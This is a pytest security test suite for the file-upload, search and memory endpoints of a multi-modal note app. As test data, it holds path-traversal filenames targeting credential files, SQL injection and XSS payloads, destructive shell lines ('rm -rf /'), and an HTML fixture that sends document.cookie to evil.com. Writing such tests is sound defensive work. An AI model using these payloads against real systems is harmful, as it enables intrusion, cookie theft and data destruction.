"""
Multi-Modal Security Tests for Second Brain v2.6.0
Comprehensive testing of security features, authentication, and vulnerability prevention.
"""

import pytest
import tempfile
import os
from pathlib import Path
from uuid import uuid4
import io

from fastapi.testclient import TestClient
from unittest.mock import AsyncMock, patch, MagicMock

from multimodal.models import ContentType
from multimodal.api import router
from multimodal.database import MultiModalDatabase


class TestMultiModalSecurity:
    """Security tests for multi-modal system in Second Brain v2.6.0"""
    
    @pytest.fixture
    def test_client(self):
        """Test client with authentication bypass for testing."""
        from fastapi import FastAPI
        app = FastAPI()
        app.include_router(router)
        
        # Mock authentication for testing
        async def mock_auth():
            return {"user_id": "test_user"}
        
        router.dependency_overrides[router.get_current_user] = mock_auth
        return TestClient(app)
    
    @pytest.fixture
    def mock_database(self):
        """Mock database for security testing."""
        mock_db = AsyncMock(spec=MultiModalDatabase)
        return mock_db
    
    def test_file_upload_size_limit(self, test_client):
        """Test file upload size limitations prevent DoS attacks."""
        # Create a file larger than 100MB limit
        large_content = b"A" * (101 * 1024 * 1024)  # 101MB
        
        response = test_client.post(
            "/multimodal/upload",
            files={"file": ("large_file.txt", io.BytesIO(large_content), "text/plain")},
            data={"content": "Test large file"}
        )
        
        assert response.status_code == 413  # Request Entity Too Large
        assert "File too large" in response.json()["detail"]
    
    def test_malicious_filename_prevention(self, test_client):
        """Test prevention of path traversal attacks in filenames."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
            "<script>alert('xss')</script>.txt",
            "file'; DROP TABLE memories; --.txt"
        ]
        
        for filename in malicious_filenames:
            response = test_client.post(
                "/multimodal/upload",
                files={"file": (filename, io.BytesIO(b"test content"), "text/plain")},
                data={"content": "Test malicious filename"}
            )
            
            # Should either sanitize the filename or reject it
            if response.status_code == 200:
                # If accepted, filename should be sanitized
                result = response.json()
                assert "../" not in result["file_name"]
                assert "<script>" not in result["file_name"]
                assert "DROP TABLE" not in result["file_name"]
    
    def test_file_type_validation(self, test_client):
        """Test validation of file types prevents execution of malicious files."""
        malicious_files = [
            ("malware.exe", b"MZ\x90\x00", "application/x-executable"),
            ("script.bat", b"@echo off\nformat c:", "application/x-msdos-program"),
            ("shell.sh", b"#!/bin/bash\nrm -rf /", "application/x-sh"),
            ("macro.docm", b"PK\x03\x04", "application/vnd.ms-word.document.macroEnabled.12")
        ]
        
        for filename, content, mime_type in malicious_files:
            response = test_client.post(
                "/multimodal/upload",
                files={"file": (filename, io.BytesIO(content), mime_type)},
                data={"content": "Test malicious file type"}
            )
            
            # Should handle safely - either process as document or reject
            if response.status_code == 200:
                result = response.json()
                # Should not be processed as executable
                assert result["content_type"] in [ContentType.TEXT, ContentType.DOCUMENT]
    
    def test_sql_injection_prevention(self, test_client, mock_database):
        """Test SQL injection prevention in search queries."""
        injection_payloads = [
            "'; DROP TABLE multimodal_memories; --",
            "' UNION SELECT password FROM users --",
            "1'; UPDATE memories SET importance = 0; --",
            "test' OR '1'='1",
            "'; INSERT INTO memories (content) VALUES ('injected'); --"
        ]
        
        for payload in injection_payloads:
            response = test_client.post(
                "/multimodal/search",
                json={
                    "query": payload,
                    "limit": 10
                }
            )
            
            # Should not cause internal server error or expose database structure
            assert response.status_code != 500
            if response.status_code == 200:
                # Results should not contain injection artifacts
                result = response.json()
                assert "DROP TABLE" not in str(result)
                assert "UNION SELECT" not in str(result)
    
    def test_xss_prevention_in_content(self, test_client):
        """Test XSS prevention in user-supplied content."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src='x' onerror='alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        ]
        
        for payload in xss_payloads:
            response = test_client.post(
                "/multimodal/memories",
                json={
                    "content": payload,
                    "content_type": "text",
                    "importance": 5.0,
                    "tags": ["security-test"]
                }
            )
            
            if response.status_code == 200:
                result = response.json()
                # Content should be sanitized or escaped
                stored_content = result.get("content", "")
                assert "<script>" not in stored_content or "&lt;script&gt;" in stored_content
    
    def test_authentication_required(self, test_client):
        """Test that authentication is required for API endpoints."""
        # Remove auth override to test actual authentication
        if hasattr(router, 'dependency_overrides'):
            router.dependency_overrides.clear()
        
        endpoints = [
            ("POST", "/multimodal/memories"),
            ("GET", "/multimodal/memories"),
            ("POST", "/multimodal/search"),
            ("POST", "/multimodal/upload"),
            ("GET", "/multimodal/stats")
        ]
        
        for method, endpoint in endpoints:
            if method == "POST":
                response = test_client.post(endpoint, json={})
            else:
                response = test_client.get(endpoint)
            
            # Should require authentication (401 or 403)
            assert response.status_code in [401, 403], f"Endpoint {endpoint} should require authentication"
    
    def test_rate_limiting_simulation(self, test_client):
        """Simulate rate limiting tests (would need actual rate limiter in production)."""
        # This would test actual rate limiting if implemented
        # For now, test that multiple rapid requests don't cause issues
        
        responses = []
        for i in range(50):  # Rapid requests
            response = test_client.get("/multimodal/health")
            responses.append(response.status_code)
        
        # Should handle rapid requests gracefully
        error_count = sum(1 for status in responses if status >= 500)
        assert error_count < 5, "Too many server errors under load"
    
    def test_sensitive_data_exposure_prevention(self, test_client):
        """Test that sensitive data is not exposed in API responses."""
        # Test that internal database details, file paths, etc. are not exposed
        response = test_client.get("/multimodal/health")
        
        if response.status_code == 200:
            result = response.json()
            
            # Should not expose sensitive internal information
            sensitive_keys = ["password", "secret", "key", "token", "private"]
            response_text = str(result).lower()
            
            for sensitive in sensitive_keys:
                assert sensitive not in response_text or f"_{sensitive}" in response_text  # Allow field names like "api_key_set"
    
    def test_file_content_sanitization(self, test_client):
        """Test that file content is properly sanitized."""
        malicious_content = """
        <script>
        fetch('/admin/delete-all-users', {method: 'POST'});
        </script>
        <img src="http://evil.com/steal?data=" + document.cookie>
        """
        
        response = test_client.post(
            "/multimodal/upload",
            files={"file": ("malicious.html", io.BytesIO(malicious_content.encode()), "text/html")},
            data={"content": "Test file content sanitization", "extract_text": "true"}
        )
        
        # Should handle HTML content safely
        assert response.status_code in [200, 422]  # Either processed safely or rejected
    
    def test_memory_access_controls(self, test_client):
        """Test that users can only access their own memories."""
        # This would test user isolation in a multi-tenant system
        # For now, test that invalid UUIDs are handled properly
        
        invalid_ids = [
            "invalid-uuid",
            "'; DROP TABLE memories; --",
            "../../../etc/passwd",
            "00000000-0000-0000-0000-000000000000"
        ]
        
        for memory_id in invalid_ids:
            response = test_client.get(f"/multimodal/memories/{memory_id}")
            
            # Should handle invalid IDs gracefully
            assert response.status_code in [400, 404, 422], f"Invalid ID {memory_id} should be rejected"
    
    def test_file_processing_safety(self, test_client):
        """Test that file processing operations are safe from attacks."""
        # Test various potentially malicious file types
        test_files = [
            # Zip bomb (small file that expands hugely)
            ("bomb.zip", b"PK\x03\x04" + b"\x00" * 100, "application/zip"),
            
            # PDF with JavaScript
            ("malicious.pdf", b"%PDF-1.4\n1 0 obj<</JS(app.alert('XSS'))>>", "application/pdf"),
            
            # Image with embedded script
            ("script.svg", b'<svg><script>alert("xss")</script></svg>', "image/svg+xml")
        ]
        
        for filename, content, mime_type in test_files:
            response = test_client.post(
                "/multimodal/upload",
                files={"file": (filename, io.BytesIO(content), mime_type)},
                data={"content": "Test file processing safety", "analyze_content": "true"}
            )
            
            # Should handle malicious files safely
            if response.status_code == 200:
                result = response.json()
                assert result["processing_status"] in ["completed", "failed"]  # Should not crash
    
    @pytest.mark.asyncio
    async def test_database_connection_security(self):
        """Test database connection security measures."""
        # Test that database connections use secure parameters
        db = MultiModalDatabase()
        
        # Should not expose credentials in connection string
        if hasattr(db, 'database_url') and db.database_url:
            # Connection string should not contain plain text passwords in logs
            assert "password" not in db.database_url or db.database_url.startswith("postgresql://")
    
    def test_error_message_safety(self, test_client):
        """Test that error messages don't leak sensitive information."""
        # Trigger various errors and check that they don't expose internals
        error_tests = [
            ("POST", "/multimodal/memories", {"invalid": "data"}),
            ("GET", "/multimodal/memories/invalid-uuid"),
            ("POST", "/multimodal/search", {"query": ""}),  # Empty query
        ]
        
        for method, endpoint, data in error_tests:
            if method == "POST":
                response = test_client.post(endpoint, json=data)
            else:
                response = test_client.get(endpoint)
            
            if response.status_code >= 400:
                error_detail = response.json().get("detail", "")
                
                # Error messages should not contain sensitive info
                sensitive_patterns = [
                    "password", "secret", "key", "token",
                    "/var/", "/etc/", "c:\\", "database",
                    "traceback", "stack trace"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern.lower() not in error_detail.lower(), f"Error message contains sensitive info: {pattern}"


class TestFileUploadSecurity:
    """Specific security tests for file upload functionality."""
    
    def test_mime_type_validation(self):
        """Test MIME type validation and spoofing prevention."""
        # Test that MIME type is validated against actual file content
        fake_image = b"This is not an image"  # Text content
        real_image_header = b"\x89PNG\r\n\x1a\n"  # PNG header
        
        # This would be tested with actual file processing
        pass  # Placeholder for implementation
    
    def test_file_size_verification(self):
        """Test that reported file size matches actual content."""
        # Ensure that Content-Length header matches actual uploaded data
        pass  # Placeholder for implementation
    
    def test_temporary_file_cleanup(self):
        """Test that temporary files are properly cleaned up."""
        # Verify no temporary files are left behind after processing
        pass  # Placeholder for implementation
    
    def test_concurrent_upload_safety(self):
        """Test that concurrent uploads don't cause race conditions."""
        # Test multiple simultaneous uploads
        pass  # Placeholder for implementation


class TestDataValidationSecurity:
    """Security tests for data validation and sanitization."""
    
    def test_importance_score_validation(self):
        """Test that importance scores are properly validated."""
        invalid_scores = [-1, 11, "high", None, float('inf'), float('-inf')]
        
        # These should all be rejected or sanitized
        for score in invalid_scores:
            # Test would validate that invalid scores are handled safely
            pass
    
    def test_tag_sanitization(self):
        """Test that tags are properly sanitized."""
        malicious_tags = [
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "'; DROP TABLE tags; --",
            "javascript:alert(1)"
        ]
        
        # Tags should be sanitized or rejected
        for tag in malicious_tags:
            # Test would ensure tags are safe
            pass
    
    def test_metadata_validation(self):
        """Test that metadata is properly validated and sanitized."""
        malicious_metadata = {
            "script": "<script>alert('xss')</script>",
            "sql": "'; DROP TABLE memories; --",
            "path": "../../../etc/passwd",
            "code": "eval('malicious code')"
        }
        
        # Metadata should be safe to store and retrieve
        # Test would validate proper handling
        pass


if __name__ == "__main__":
    pytest.main([__file__])
